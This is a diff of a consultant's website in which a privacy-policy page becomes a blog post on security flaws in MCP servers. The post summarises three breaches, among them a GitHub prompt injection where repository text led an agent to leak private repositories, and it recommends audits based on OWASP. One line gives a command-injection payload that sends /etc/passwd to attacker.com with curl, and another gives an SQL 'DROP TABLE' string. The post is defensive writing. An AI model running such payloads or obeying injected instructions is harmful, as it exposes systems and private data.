@@ -6,8 +6,11 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
+<meta name="author" content="Clarke Bishop">
+<meta name="dcterms.date" content="2026-04-09">
+<meta name="description" content="43% of MCP servers have command-injection flaws. Three real breaches prove the risk. Here’s the OWASP framework to audit your MCP deployments now.">
 
-<title>Privacy Policy – Clarke Bishop</title>
+<title>43% of Your MCP Servers Have a Command-Injection Vulnerability. Now What? – Clarke Bishop</title>
 <style>
 code{white-space: pre-wrap;}
 span.smallcaps{font-variant: small-caps;}
@@ -24,27 +27,27 @@ ul.task-list li input[type="checkbox"] {
 </style>
 
 
-<script src="site_libs/quarto-nav/quarto-nav.js"></script>
-<script src="site_libs/quarto-nav/headroom.min.js"></script>
-<script src="site_libs/clipboard/clipboard.min.js"></script>
-<script src="site_libs/quarto-search/autocomplete.umd.js"></script>
-<script src="site_libs/quarto-search/fuse.min.js"></script>
-<script src="site_libs/quarto-search/quarto-search.js"></script>
-<meta name="quarto:offset" content="./">
-<link href="./images/clarke-bishop-logo.svg" rel="icon" type="image/svg+xml">
-<script src="site_libs/cookie-consent/cookie-consent.js"></script>
-<link href="site_libs/cookie-consent/cookie-consent.css" rel="stylesheet">
-<script src="site_libs/quarto-html/quarto.js" type="module"></script>
-<script src="site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
-<script src="site_libs/quarto-html/axe/axe-check.js" type="module"></script>
-<script src="site_libs/quarto-html/popper.min.js"></script>
-<script src="site_libs/quarto-html/tippy.umd.min.js"></script>
-<script src="site_libs/quarto-html/anchor.min.js"></script>
-<link href="site_libs/quarto-html/tippy.css" rel="stylesheet">
-<link href="site_libs/quarto-html/quarto-syntax-highlighting-8ad03fe86e570ceba7d3bfbbc87c6450.css" rel="stylesheet" id="quarto-text-highlighting-styles">
-<script src="site_libs/bootstrap/bootstrap.min.js"></script>
-<link href="site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="site_libs/bootstrap/bootstrap-991977f37c53887e75f2f4f3721a696d.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<script src="../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../">
+<link href="../images/clarke-bishop-logo.svg" rel="icon" type="image/svg+xml">
+<script src="../site_libs/cookie-consent/cookie-consent.js"></script>
+<link href="../site_libs/cookie-consent/cookie-consent.css" rel="stylesheet">
+<script src="../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../site_libs/quarto-html/axe/axe-check.js" type="module"></script>
+<script src="../site_libs/quarto-html/popper.min.js"></script>
+<script src="../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../site_libs/quarto-html/quarto-syntax-highlighting-8ad03fe86e570ceba7d3bfbbc87c6450.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../site_libs/bootstrap/bootstrap-991977f37c53887e75f2f4f3721a696d.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
 <script id="quarto-search-options" type="application/json">{
   "location": "navbar",
   "copy-button": false,
@@ -102,8 +105,8 @@ cookieconsent.run({
 <style>html{ scroll-behavior: smooth; }</style>
 
 
-<link rel="stylesheet" href="styles.css">
-<link rel="canonical" href="https://clarkebishop.com/privacy.html">
+<link rel="stylesheet" href="../styles.css">
+<link rel="canonical" href="https://clarkebishop.com/posts/mcp-server-security-vulnerabilities-command-injection.html">
 </head>
 
 <body class="nav-fixed quarto-light">
@@ -113,11 +116,11 @@ cookieconsent.run({
     <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
       <div class="navbar-container container-fluid">
       <div class="navbar-brand-container mx-auto">
-    <a href="./index.html" class="navbar-brand navbar-brand-logo">
-    <img src="./images/clarke-bishop-logo.svg" alt="" class="navbar-logo light-content">
-    <img src="./images/clarke-bishop-logo.svg" alt="" class="navbar-logo dark-content">
+    <a href="../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../images/clarke-bishop-logo.svg" alt="" class="navbar-logo light-content">
+    <img src="../images/clarke-bishop-logo.svg" alt="" class="navbar-logo dark-content">
     </a>
-    <a class="navbar-brand" href="./index.html">
+    <a class="navbar-brand" href="../index.html">
     <span class="navbar-title">Clarke Bishop</span>
     </a>
   </div>
@@ -127,19 +130,19 @@ cookieconsent.run({
           <div class="collapse navbar-collapse" id="navbarCollapse">
             <ul class="navbar-nav navbar-nav-scroll me-auto">
   <li class="nav-item">
-    <a class="nav-link" href="./index.html"> 
+    <a class="nav-link" href="../index.html"> 
 <span class="menu-text">Home</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./about.html"> 
+    <a class="nav-link" href="../about.html"> 
 <span class="menu-text">About</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./services.html"> 
+    <a class="nav-link" href="../services.html"> 
 <span class="menu-text">Services</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./blog.html"> 
+    <a class="nav-link" href="../blog.html"> 
 <span class="menu-text">Blog</span></a>
   </li>  
 </ul>
@@ -165,19 +168,20 @@ cookieconsent.run({
     <h2 id="toc-title">On this page</h2>
    
   <ul>
-  <li><a href="#privacy-policy" id="toc-privacy-policy" class="nav-link active" data-scroll-target="#privacy-policy">Privacy Policy</a>
+  <li><a href="#tldr" id="toc-tldr" class="nav-link active" data-scroll-target="#tldr">TL;DR</a></li>
+  <li><a href="#mcp-is-the-reason-your-ai-agents-can-actually-do-things" id="toc-mcp-is-the-reason-your-ai-agents-can-actually-do-things" class="nav-link" data-scroll-target="#mcp-is-the-reason-your-ai-agents-can-actually-do-things">MCP is the reason your AI agents can actually do things</a></li>
+  <li><a href="#this-isnt-theoretical-it-already-happened" id="toc-this-isnt-theoretical-it-already-happened" class="nav-link" data-scroll-target="#this-isnt-theoretical-it-already-happened">This isn’t theoretical — it already happened</a>
   <ul class="collapse">
-  <li><a href="#information-we-collect" id="toc-information-we-collect" class="nav-link" data-scroll-target="#information-we-collect">Information We Collect</a></li>
-  <li><a href="#how-we-use-your-information" id="toc-how-we-use-your-information" class="nav-link" data-scroll-target="#how-we-use-your-information">How We Use Your Information</a></li>
-  <li><a href="#information-sharing" id="toc-information-sharing" class="nav-link" data-scroll-target="#information-sharing">Information Sharing</a></li>
-  <li><a href="#cookies-and-tracking" id="toc-cookies-and-tracking" class="nav-link" data-scroll-target="#cookies-and-tracking">Cookies and Tracking</a></li>
-  <li><a href="#data-security" id="toc-data-security" class="nav-link" data-scroll-target="#data-security">Data Security</a></li>
-  <li><a href="#your-rights" id="toc-your-rights" class="nav-link" data-scroll-target="#your-rights">Your Rights</a></li>
-  <li><a href="#third-party-services" id="toc-third-party-services" class="nav-link" data-scroll-target="#third-party-services">Third-Party Services</a></li>
-  <li><a href="#changes-to-this-policy" id="toc-changes-to-this-policy" class="nav-link" data-scroll-target="#changes-to-this-policy">Changes to This Policy</a></li>
-  <li><a href="#legal-entity" id="toc-legal-entity" class="nav-link" data-scroll-target="#legal-entity">Legal Entity</a></li>
-  <li><a href="#contact" id="toc-contact" class="nav-link" data-scroll-target="#contact">Contact</a></li>
+  <li><a href="#postmark-the-supply-chain-attack" id="toc-postmark-the-supply-chain-attack" class="nav-link" data-scroll-target="#postmark-the-supply-chain-attack">Postmark: the supply chain attack</a></li>
+  <li><a href="#github-the-prompt-injection" id="toc-github-the-prompt-injection" class="nav-link" data-scroll-target="#github-the-prompt-injection">GitHub: the prompt injection</a></li>
+  <li><a href="#asana-the-cross-org-data-leak" id="toc-asana-the-cross-org-data-leak" class="nav-link" data-scroll-target="#asana-the-cross-org-data-leak">Asana: the cross-org data leak</a></li>
   </ul></li>
+  <li><a href="#command-injection-is-sql-injections-older-meaner-cousin" id="toc-command-injection-is-sql-injections-older-meaner-cousin" class="nav-link" data-scroll-target="#command-injection-is-sql-injections-older-meaner-cousin">Command injection is SQL injection’s older, meaner cousin</a>
+  <ul class="collapse">
+  <li><a href="#your-api-playbook-wont-save-you-here" id="toc-your-api-playbook-wont-save-you-here" class="nav-link" data-scroll-target="#your-api-playbook-wont-save-you-here">Your API playbook won’t save you here</a></li>
+  </ul></li>
+  <li><a href="#the-framework-exists-most-companies-havent-adopted-it" id="toc-the-framework-exists-most-companies-havent-adopted-it" class="nav-link" data-scroll-target="#the-framework-exists-most-companies-havent-adopted-it">The framework exists — most companies haven’t adopted it</a></li>
+  <li><a href="#the-window-is-months-not-years" id="toc-the-window-is-months-not-years" class="nav-link" data-scroll-target="#the-window-is-months-not-years">The window is months, not years</a></li>
   </ul>
 </nav>
     </div>
@@ -186,14 +190,36 @@ cookieconsent.run({
 
 <header id="title-block-header" class="quarto-title-block default">
 <div class="quarto-title">
-<h1 class="title">Privacy Policy</h1>
-</div>
+<h1 class="title">43% of Your MCP Servers Have a Command-Injection Vulnerability. Now What?</h1>
+  <div class="quarto-categories">
+    <div class="quarto-category">AI Strategy</div>
+    <div class="quarto-category">Implementation</div>
+    <div class="quarto-category">Security</div>
+  </div>
+  </div>
 
+<div>
+  <div class="description">
+    43% of MCP servers have command-injection flaws. Three real breaches prove the risk. Here’s the OWASP framework to audit your MCP deployments now.
+  </div>
+</div>
 
 
 <div class="quarto-title-meta">
 
+    <div>
+    <div class="quarto-title-meta-heading">Author</div>
+    <div class="quarto-title-meta-contents">
+             <p>Clarke Bishop </p>
+          </div>
+  </div>
     
+    <div>
+    <div class="quarto-title-meta-heading">Published</div>
+    <div class="quarto-title-meta-contents">
+      <p class="date">April 9, 2026</p>
+    </div>
+  </div>
   
     
   </div>
@@ -203,87 +229,95 @@ cookieconsent.run({
 </header>
 
 
-<section id="privacy-policy" class="level2">
-<h2 class="anchored" data-anchor-id="privacy-policy">Privacy Policy</h2>
-<p><strong>Last Updated:</strong> November 2025</p>
-<section id="information-we-collect" class="level3">
-<h3 class="anchored" data-anchor-id="information-we-collect">Information We Collect</h3>
-<p>When you use this website or schedule a consultation, we may collect:</p>
+<p><img src="../images/posts/mcp-server-security-vulnerabilities-command-injection.png" class="img-fluid"></p>
+<section id="tldr" class="level2">
+<h2 class="anchored" data-anchor-id="tldr">TL;DR</h2>
 <ul>
-<li>Contact information (name, email address, phone number)</li>
-<li>Information you provide during consultations or communications</li>
-<li>Website usage data through analytics tools</li>
+<li><strong><a href="https://equixly.com/blog/2025/03/29/mcp-server-new-security-nightmare/">43% of tested MCP servers</a> have command-injection vulnerabilities</strong> — the average OWASP security score is 34 out of 100</li>
+<li><strong>Three documented breaches</strong> at Postmark, GitHub, and Asana prove this isn’t theoretical</li>
+<li><strong>Chaining just 10 MCP plugins</strong> creates a <a href="https://venturebeat.com/security/mcp-stacks-have-a-92-exploit-probability-how-10-plugins-became-enterprise">92% probability</a> of exploitation</li>
+<li><strong>The OWASP MCP Top 10</strong> gives you a framework to start auditing today</li>
 </ul>
+<p>You deployed MCP to make your AI agents useful. You probably didn’t audit the servers they’re calling.</p>
+<p>Equixly tested the most popular MCP server implementations and found that <a href="https://equixly.com/blog/2025/03/29/mcp-server-new-security-nightmare/">43% have command-injection vulnerabilities</a>. The average OWASP security score across those servers? <strong>34 out of 100.</strong> And Adversa AI scanned 539 servers and found that <a href="https://adversa.ai/mcp-security-top-25-mcp-vulnerabilities/">38% completely lack authentication</a>.</p>
+<p>This isn’t an edge case. It’s the default state of MCP security right now.</p>
 </section>
-<section id="how-we-use-your-information" class="level3">
-<h3 class="anchored" data-anchor-id="how-we-use-your-information">How We Use Your Information</h3>
-<p>We use the information we collect to:</p>
-<ul>
-<li>Respond to your inquiries and provide requested services</li>
-<li>Schedule and conduct consultations</li>
-<li>Improve our website and services</li>
-<li>Send relevant updates about our services (with your consent)</li>
-</ul>
+<section id="mcp-is-the-reason-your-ai-agents-can-actually-do-things" class="level2">
+<h2 class="anchored" data-anchor-id="mcp-is-the-reason-your-ai-agents-can-actually-do-things">MCP is the reason your AI agents can actually do things</h2>
+<p>Before MCP, every AI integration was a custom, brittle point-to-point connection. You wanted your agent to query a database? Write a custom connector. Send an email? Another connector. Access a code repo? Yet another one.</p>
+<p>MCP — the Model Context Protocol — standardized that interface. One protocol, hundreds of tools. Your agent can read production databases, send emails, deploy code, and update CRMs through a single, open standard.</p>
+<p>That’s why adoption is exploding: <a href="https://www.shaungehring.com/gehring-blog/mcp-hit-97-million-downloads-and-most-devs-still-dont-know-what-it-is">97 million monthly SDK downloads</a>, 16,000+ active servers, and the protocol was donated to the Linux Foundation in December 2025.</p>
+<p>Companies using MCP are shipping AI workflows in days that used to take months of custom API integration. The alternative — building and maintaining custom connectors for every tool — doesn’t scale and creates its own security burden.</p>
+<p>But here’s the tension: <strong>the same power that makes MCP valuable</strong> — agents autonomously calling tools on your infrastructure — <strong>is exactly what makes it dangerous when unsecured.</strong></p>
+<p>And the security picture is grim. Beyond the 43% command-injection rate and 38% lacking authentication, Pynt analyzed 281 MCP servers and found that chaining just 10 plugins creates a <a href="https://venturebeat.com/security/mcp-stacks-have-a-92-exploit-probability-how-10-plugins-became-enterprise">92% probability of exploitation</a>. Each tool call expands the attack surface for the next one. In the first 60 days of widespread MCP deployment, researchers filed <a href="https://www.heyuan110.com/posts/ai/2026-03-10-mcp-security-2026/">30+ CVEs</a> — including a CVSS 9.8 remote code execution.</p>
+<p>This isn’t a reason to avoid MCP. It’s a reason to audit it the way you’d audit any infrastructure that touches production data.</p>
+<blockquote class="blockquote">
+<p>The attack surface for MCP isn’t theoretical. It’s being mapped faster than defenses are being built.</p>
+<p>— Clarke Bishop</p>
+</blockquote>
 </section>
-<section id="information-sharing" class="level3">
-<h3 class="anchored" data-anchor-id="information-sharing">Information Sharing</h3>
-<p>We do not sell, trade, or rent your personal information to third parties. We may share information with:</p>
-<ul>
-<li>Service providers who assist in our operations (e.g., calendar scheduling, email services)</li>
-<li>Legal authorities when required by law</li>
-</ul>
+<section id="this-isnt-theoretical-it-already-happened" class="level2">
+<h2 class="anchored" data-anchor-id="this-isnt-theoretical-it-already-happened">This isn’t theoretical — it already happened</h2>
+<p>Three documented breaches demonstrate what happens when MCP security is an afterthought. Each exploited a different failure mode.</p>
+<section id="postmark-the-supply-chain-attack" class="level3">
+<h3 class="anchored" data-anchor-id="postmark-the-supply-chain-attack">Postmark: the supply chain attack</h3>
+<p>In September 2025, a <a href="https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html">malicious npm package</a> called “postmark-mcp” appeared on the npm registry. It mimicked the official Postmark Labs library — same name pattern, similar description. But version 1.0.16 had a twist: it silently BCC’d every outgoing email to the attacker’s personal address.</p>
+<p>1,643 teams <a href="https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/">installed it</a> before anyone noticed. Every email those teams sent through the compromised server — customer communications, invoices, password resets — was copied to an attacker.</p>
 </section>
-<section id="cookies-and-tracking" class="level3">
-<h3 class="anchored" data-anchor-id="cookies-and-tracking">Cookies and Tracking</h3>
-<p>This website may use cookies and similar technologies to:</p>
-<ul>
-<li>Analyze website traffic and usage patterns</li>
-<li>Improve user experience</li>
-<li>Remember your preferences</li>
-</ul>
-<p>You can control cookies through your browser settings.</p>
+<section id="github-the-prompt-injection" class="level3">
+<h3 class="anchored" data-anchor-id="github-the-prompt-injection">GitHub: the prompt injection</h3>
+<p>GitHub’s MCP integration was <a href="https://www.docker.com/blog/mcp-horror-stories-github-prompt-injection/">exploited via prompt injection</a>. An attacker placed malicious instructions inside a repository’s content.</p>
+<p>When a developer’s AI agent accessed that repo through MCP, the injected prompt triggered the agent to exfiltrate data from other private repositories accessible via the same personal access token.</p>
+<p>The root cause: broad PAT tokens with no per-repo scope boundaries in MCP tool permissions. One compromised repo <a href="https://invariantlabs.ai/blog/mcp-github-vulnerability">exposed every repo</a> the token could access.</p>
 </section>
-<section id="data-security" class="level3">
-<h3 class="anchored" data-anchor-id="data-security">Data Security</h3>
-<p>We implement reasonable security measures to protect your personal information. However, no method of transmission over the Internet is 100% secure.</p>
+<section id="asana-the-cross-org-data-leak" class="level3">
+<h3 class="anchored" data-anchor-id="asana-the-cross-org-data-leak">Asana: the cross-org data leak</h3>
+<p>Asana’s MCP feature had a <a href="https://www.bleepingcomputer.com/news/security/asana-warns-mcp-ai-feature-exposed-customer-data-to-other-orgs/">tenant isolation flaw</a>. Agents could access data from organizations they weren’t authorized to see. Roughly <a href="https://authzed.com/blog/timeline-mcp-breaches">1,000 customers</a> were affected before the issue was patched in June 2025.</p>
+<p>Three breaches. Three different attack vectors — supply chain, prompt injection, tenant isolation. There’s no single fix that addresses all of them. You need a framework.</p>
 </section>
-<section id="your-rights" class="level3">
-<h3 class="anchored" data-anchor-id="your-rights">Your Rights</h3>
-<p>You have the right to:</p>
-<ul>
-<li>Access the personal information we hold about you</li>
-<li>Request correction of inaccurate information</li>
-<li>Request deletion of your information</li>
-<li>Opt-out of marketing communications</li>
-</ul>
 </section>
-<section id="third-party-services" class="level3">
-<h3 class="anchored" data-anchor-id="third-party-services">Third-Party Services</h3>
-<p>This website may use third-party services such as:</p>
-<ul>
-<li>Google Analytics for website analytics</li>
-<li>Calendar scheduling tools for appointment booking</li>
-<li>Email service providers for communications</li>
-</ul>
-<p>These services have their own privacy policies.</p>
+<section id="command-injection-is-sql-injections-older-meaner-cousin" class="level2">
+<h2 class="anchored" data-anchor-id="command-injection-is-sql-injections-older-meaner-cousin">Command injection is SQL injection’s older, meaner cousin</h2>
+<p>If you’ve been building software for more than a decade, you lived through the SQL injection era. Command injection is the same class of flaw — applied to the operating system instead of the database.</p>
+<p><strong>SQL injection:</strong> An attacker puts <code>'; DROP TABLE users; --</code> into a form field. Your app concatenates it into a query. The database executes it.</p>
+<p><strong>Command injection:</strong> An MCP tool takes input — a filename, a URL, a search term — and passes it to a shell command. An attacker, or a prompt-injected agent, puts <code>; curl attacker.com/exfil?data=$(cat /etc/passwd)</code> into that input. Your server executes it.</p>
+<p>Same principle. Different blast radius.</p>
+<p>Command injection is so common in MCP servers (43%) because <strong>MCP tools frequently shell out</strong> to system utilities — git, curl, docker, file converters. The tool is often a thin wrapper around a command.</p>
+<p>Many MCP servers are written by ML engineers and hobbyists, not security engineers. Input sanitization is an afterthought. The <a href="https://equixly.com/blog/2025/03/29/mcp-server-new-security-nightmare/">OWASP score of 34/100</a> reflects this — basic hygiene like parameterized commands, input validation, and sandboxing is simply missing.</p>
+<p>Here’s what makes it worse in the MCP context: with SQL injection, a human types the malicious input. With MCP, <strong>a prompt-injected agent generates it</strong> autonomously — at machine speed, across multiple tools.</p>
+<p>Chaining compounds the risk. A command-injection flaw in one tool can be used to pivot to every other tool on the same server.</p>
+<section id="your-api-playbook-wont-save-you-here" class="level3">
+<h3 class="anchored" data-anchor-id="your-api-playbook-wont-save-you-here">Your API playbook won’t save you here</h3>
+<p>Most teams deploying MCP treat it like they treated REST APIs: add authentication, rate-limit, ship. That approach fails because MCP is not an API.</p>
+<p>An API waits for a human to initiate every request. An MCP server gives an AI agent the ability to decide what to call, when, and in what order — autonomously. The 92% exploit probability when chaining 10 plugins exists precisely because teams apply API security thinking to an agent security problem.</p>
+<p>Three <a href="https://owasp.org/www-project-mcp-top-10/">OWASP MCP categories</a> have no API equivalent at all: Tool Poisoning (MCP03), Intent Flow Subversion (MCP06), and Shadow MCP Servers (MCP09). If your security review starts and ends with “add auth and rate limiting,” you’re solving yesterday’s problem.</p>
+<blockquote class="blockquote">
+<p>MCP isn’t an API. It allows an autonomous agent access to your infrastructure. The threat model is different because the actor is different.</p>
+<p>— Clarke Bishop</p>
+</blockquote>
 </section>
-<section id="changes-to-this-policy" class="level3">
-<h3 class="anchored" data-anchor-id="changes-to-this-policy">Changes to This Policy</h3>
-<p>We may update this privacy policy from time to time. Changes will be posted on this page with an updated revision date.</p>
 </section>
-<section id="legal-entity" class="level3">
-<h3 class="anchored" data-anchor-id="legal-entity">Legal Entity</h3>
-<p>Clarke Bishop Consulting is a trade name of Inbound Team, LLC, doing business as Clarke Bishop Consulting.</p>
+<section id="the-framework-exists-most-companies-havent-adopted-it" class="level2">
+<h2 class="anchored" data-anchor-id="the-framework-exists-most-companies-havent-adopted-it">The framework exists — most companies haven’t adopted it</h2>
+<p>OWASP published a dedicated <a href="https://owasp.org/www-project-mcp-top-10/">MCP Top 10 framework</a> — the first standardized security framework for Model Context Protocol implementations. It covers everything from token mismanagement to shadow servers. <a href="https://microsoft.github.io/mcp-azure-security-guide/">Microsoft published Azure-specific guidance</a> mapping it to their cloud platform.</p>
+<p>The framework exists. Most companies deploying MCP haven’t adopted it. Here’s where to start:</p>
+<p><strong>1. Audit your supply chain (MCP04).</strong> Verify every MCP server package against official sources. Pin versions. The Postmark breach happened because someone installed a package that <em>looked</em> right.</p>
+<p><strong>2. Scope tool permissions (MCP02, MCP07).</strong> Least-privilege per tool, not per server. The GitHub breach happened because a single PAT token gave the agent access to every repo. Scope access to exactly what each tool needs — nothing more.</p>
+<p><strong>3. Validate inputs at every tool boundary (MCP05).</strong> Command injection is the #1 finding because it’s the easiest to miss. If any tool passes agent-supplied input to a shell command, subprocess, or exec call — you likely have this flaw. Use parameterized commands.</p>
+<p><strong>4. Monitor intent flow (MCP06, MCP08).</strong> Log what agents actually do, not just what they’re asked to do. Detect prompt injection attempts. If an agent starts accessing resources it wasn’t directed to — that’s a signal.</p>
+<p><strong>5. Discover shadow servers (MCP09).</strong> If your developers can <code>npm install</code> an MCP server without review, you have servers you don’t know about. Inventory everything. Unknown servers are unaudited servers.</p>
+<p>Start with a 30-minute exercise: <strong>inventory every MCP server</strong> in your environment, check auth status, and review tool permissions. That single audit surfaces 80% of the risk.</p>
 </section>
-<section id="contact" class="level3">
-<h3 class="anchored" data-anchor-id="contact">Contact</h3>
-<p>If you have questions about this privacy policy, please contact:</p>
-<p>Clarke Bishop Consulting (Inbound Team, LLC)</p>
+<section id="the-window-is-months-not-years" class="level2">
+<h2 class="anchored" data-anchor-id="the-window-is-months-not-years">The window is months, not years</h2>
+<p>MCP is following the same trajectory as cloud security. Rapid adoption. Security retrofitted after breaches. The S3 bucket exposure era taught us what happens when infrastructure goes mainstream faster than security practices can keep up.</p>
+<p>We’ve been here before. Every major infrastructure shift — cloud, containers, APIs — went through the same cycle: explosive adoption, high-profile breaches, then an industry-wide scramble to retrofit security.</p>
+<p>MCP is in the explosive adoption phase right now. The breaches have started. The scramble hasn’t. And with 97 million monthly SDK downloads and 30+ CVEs in 60 days, the window to get ahead of it is narrowing fast.</p>
+<p>The companies that audit now become the case studies everyone else quotes. The companies that wait become the breach headlines. The OWASP framework gives you a starting point. The 30-minute inventory gives you a first step. The question is whether you take it before or after something goes wrong.</p>
 <hr>
-<p><em>This privacy policy applies to clarkebishop.com and related services.</em></p>
+<p><strong>Deploying MCP and haven’t audited your servers yet?</strong> <a href="../booking.html">Let’s talk</a> about getting ahead of this before it becomes a board-level conversation.</p>
 
 
-</section>
 </section>
 
 <div id="cta-bar" class="cta-bar">
@@ -727,5 +761,5 @@ cookieconsent.run({
 
 
 
-<script src="site_libs/quarto-html/zenscroll-min.js"></script>
+<script src="../site_libs/quarto-html/zenscroll-min.js"></script>
 </body></html>
